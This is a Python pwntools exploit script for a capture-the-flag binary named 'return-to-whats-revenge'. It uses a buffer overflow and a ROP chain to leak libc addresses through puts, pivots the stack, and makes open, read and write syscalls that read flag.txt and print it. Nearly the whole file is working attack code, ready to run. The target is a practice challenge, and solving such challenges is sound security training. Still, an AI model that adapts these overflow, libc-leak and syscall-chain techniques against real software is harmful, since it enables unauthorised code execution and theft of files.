from pwn import *
import sys

context.terminal = ['tmux','splitw','-h', '-p', '50']

GADGETS = {
    "pop rdi; ret" : p64(0x4019db),
    "pop rsp; pop r13; pop r14; pop r15; ret" : p64(0x4019d5),
    "pop rsi; pop r15; ret" : p64(0x4019d9),
    "ret" : p64(0x401016)
}
LIBC_GADGETS = {
    "pop rdx; ret" : 0x1b96,
    "syscall; ret" : 0xd2975,
    "pop rax; ret" : 0x439c8
}
new_stack = 0x404050

return_to_whats_revenge = ELF("./return-to-whats-revenge", checksec=False)
libc = ELF("/ctf/remote/libcs/libc6_2.27-3ubuntu1_amd64.so", checksec=False)


conn = process('./return-to-whats-revenge', env={'LD_PRELOAD':'/ctf/remote/libcs/libc6_2.27-3ubuntu1_amd64.so /glibc/2.27/64/lib/ld-2.27.so'})
conn.recvline()
conn.recvline()
if(len(sys.argv) > 1):
    gdb.attach(conn, """
    b *0x4011da
    b *0x4011d9
    """)

conn.sendline(flat([
    b"A" * 56,
    GADGETS["pop rdi; ret"],
    p64(return_to_whats_revenge.got["setvbuf"]),
    p64(return_to_whats_revenge.plt["puts"]),
    GADGETS["pop rdi; ret"],
    p64(return_to_whats_revenge.got["puts"]),
    p64(return_to_whats_revenge.plt["puts"]),
    GADGETS["pop rdi; ret"],
    p64(return_to_whats_revenge.got["gets"]),
    p64(return_to_whats_revenge.plt["puts"]),
    GADGETS["pop rdi; ret"],
    p64(new_stack),
    p64(return_to_whats_revenge.plt["gets"]),
    GADGETS["pop rsp; pop r13; pop r14; pop r15; ret"],
    p64(new_stack)
]))

setvbuf = int.from_bytes(conn.recvline()[:-1], "little")
puts = int.from_bytes(conn.recvline()[:-1], "little")
gets = int.from_bytes(conn.recvline()[:-1], "little")

if gets == 0xb0:
    exit()

log.info(f"setvbuf @ {hex(setvbuf)}")
log.info(f"puts @ {hex(puts)}")
log.info(f"gets @ {hex(gets)}")

libc_base = gets - libc.symbols["gets"]
log.info(f"Libc @ {hex(libc_base)}")

for key in LIBC_GADGETS:
    LIBC_GADGETS[key] = p64(libc_base + LIBC_GADGETS[key])

conn.sendline(flat([
    b"./flag.txt".ljust(24, b"\x00"),
    GADGETS["ret"] * 5,
    
    # open("/chal/flag.txt", 0, 0) = 3
    GADGETS["pop rdi; ret"],
    p64(new_stack),
    GADGETS["pop rsi; pop r15; ret"],
    p64(0),
    p64(0),
    LIBC_GADGETS["pop rdx; ret"],
    p64(0),
    LIBC_GADGETS["pop rax; ret"],
    p64(2),
    LIBC_GADGETS["syscall; ret"],
    
    # read(3, new_stack, 64)
    LIBC_GADGETS["pop rax; ret"],
    p64(0),
    GADGETS["pop rdi; ret"],
    p64(3),
    GADGETS["pop rsi; pop r15; ret"],
    p64(new_stack),
    p64(0),
    LIBC_GADGETS["pop rdx; ret"],
    p64(64),
    LIBC_GADGETS["syscall; ret"],
    
    # write(1, new_stack, 64)
    LIBC_GADGETS["pop rax; ret"],
    p64(1),
    GADGETS["pop rdi; ret"],
    p64(1),
    GADGETS["pop rsi; pop r15; ret"],
    p64(new_stack),
    p64(0),
    LIBC_GADGETS["pop rdx; ret"],
    p64(64),
    LIBC_GADGETS["syscall; ret"]
]))

print(conn.recvuntil(b"}"))